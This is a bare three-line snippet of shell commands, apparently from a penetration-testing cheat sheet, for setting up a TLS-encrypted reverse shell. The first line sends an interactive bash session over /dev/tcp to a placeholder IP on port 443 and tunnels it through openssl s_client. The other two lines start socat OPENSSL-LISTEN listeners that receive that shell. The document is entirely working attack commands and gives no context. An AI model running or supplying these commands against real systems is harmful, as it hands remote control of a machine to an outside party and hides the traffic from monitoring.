bash -c 'bash -i >& /dev/tcp/IP/443 0>&1' | openssl s_client -quiet -connect IP:443
socat OPENSSL-LISTEN:443,cert=attack.pem,verify=0,fork -
socat -v OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,fork,reuseaddr,verify=0 STDOUT
